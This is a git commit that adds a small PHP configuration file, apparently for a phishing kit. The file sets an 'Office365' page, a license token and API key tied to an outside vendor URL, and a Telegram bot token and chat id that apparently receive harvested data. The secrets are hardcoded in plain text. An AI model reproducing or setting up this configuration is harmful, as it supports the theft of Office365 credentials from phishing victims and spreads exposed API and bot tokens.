59ce65e7c9c86dcb5d811221324c440ccdc522e6
whelas8 <78801859+whelas8@users.noreply.github.com>
2022-02-09 05:00:53 +0300

    Add files via upload

---
+++ kami/auth/auth.php
@@ -0,0 +1,10 @@
+<?php
+$email="client1@gmail.com";   //changeable
+$token="2AD67-DF387-654C9-2642A-E4026-F9FBB-85";  //changeable
+$api_key="fa02ef87861555fc76fe93ffda2c557f"; // Do not Change
+$page="Office365"; // Changeable
+$base_url ="http://lak3code.com/web/";  // Do not Change
+$botToken = "1657145246:AAH2zW55mhU0FL8_WsMyKTZ6euhicDbG7RE";//telegram bot
+$id = "1502905512";// telegarm bot id
+?>
+
